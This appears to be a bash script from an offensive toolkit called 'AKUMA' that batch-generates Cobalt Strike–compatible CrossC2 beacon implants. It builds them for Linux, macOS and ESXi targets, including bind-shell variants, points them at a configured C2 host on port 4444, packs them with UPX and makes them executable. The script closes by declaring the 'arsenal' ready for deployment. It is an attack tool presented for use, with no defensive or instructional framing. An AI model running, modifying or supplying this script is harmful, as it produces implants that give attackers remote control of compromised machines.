#!/bin/bash
# AKUMA Mass Beacon Generator
# Generates multiple beacon types for different platforms

echo "🔥 AKUMA Mass Beacon Generator 🔥"
echo "Generating cross-platform beacon arsenal..."

# Configuration
C2_HOST="192.168.1.100"
C2_PORT="4444"
BEACON_KEYS="./.cobaltstrike.beacon_keys"
OUTPUT_DIR="./generated_beacons"

# Create output directory
mkdir -p $OUTPUT_DIR

# Platform/Arch combinations
declare -a TARGETS=(
    "Linux:x64"
    "Linux:x86"
    "MacOS:x64"
    "MacOS:M1"
    "ESXI:x64"
    "Linux-bind:x64"
    "MacOS-bind:x64"
)

# Generate beacons for each target
for target in "${TARGETS[@]}"; do
    IFS=':' read -r platform arch <<< "$target"
    output_name="${OUTPUT_DIR}/beacon_${platform,,}_${arch,,}"
    
    echo "[+] Generating $platform $arch beacon..."
    
    ./tools/genCrossC2.Linux \
        $C2_HOST \
        $C2_PORT \
        $BEACON_KEYS \
        null \
        $platform \
        $arch \
        $output_name \
        upx
    
    if [ $? -eq 0 ]; then
        echo "    ✅ Success: $output_name"
        chmod +x $output_name
    else
        echo "    ❌ Failed: $output_name"
    fi
done

echo ""
echo "🎯 Generated beacons:"
ls -la $OUTPUT_DIR/
echo ""
echo "💀 AKUMA Arsenal is ready for deployment!"
